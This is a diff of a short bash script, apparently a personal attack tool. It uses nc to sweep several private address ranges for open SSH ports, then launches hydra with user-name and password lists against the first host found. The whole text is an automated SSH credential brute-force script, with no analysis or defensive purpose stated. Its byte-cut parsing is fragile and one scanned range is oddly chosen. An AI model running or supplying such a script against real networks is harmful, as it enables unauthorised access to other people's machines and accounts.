@@ -18,15 +18,29 @@ else
 echo Your Connected To Celluar
 fi
 
- test=$(for i in {1..13}; 
+ nc192=$(for i in {1..13}; 
 do nc -n -z -v -w 1 192.168.1.$i 22; 
-done 2>&1 | grep open)
+done 2>&1 | grep open | cut -b 1,2,3,4,5,6,7,8,9,10,11,12)
 
- hydraIP=$(echo $test | cut -b 1,2,3,4,5,6,7,8,9,10,11)
+ nc10=$(for i in {1..13}; 
+do nc -n -z -v -w 1 10.0.0.$i 22; 
+done 2>&1 | grep open | cut -b 1,2,3,4,5,6,7,8,9,10,11,12)
 
-echo $hydraIP
+ nc172=$(for i in {1..13}; 
+do nc -n -z -v -w 1 172.0.0.$i 22; 
+done 2>&1 | grep open | cut -b 1,2,3,4,5,6,7,8,9,10,11,12)
 
- echo $(hydra -L /Users -P /Passwords $hydraIP ssh)
+if [[ $ip = 192.* ]]; then
+echo $(hydra -L /User/X22/Users -t 4 -P /User/X22/Passwords -t 4 $nc192 ssh -I) 
 
+elif [[ $ip = 10.* ]]; then 
+echo $(hydra -L /User/X22/Users -t 4 -P /User/X22/Passwords -t 4 $nc10 ssh -I) 
+
+elif [[ $ip = 172.* ]]; then 
+echo $(hydra -L /User/X22/Users -t 4 -P /User/X22/Passwords -t 4 $nc172 ssh -I) 
+
+fi
+
+ret=$?; times; exit "$ret"
 
 
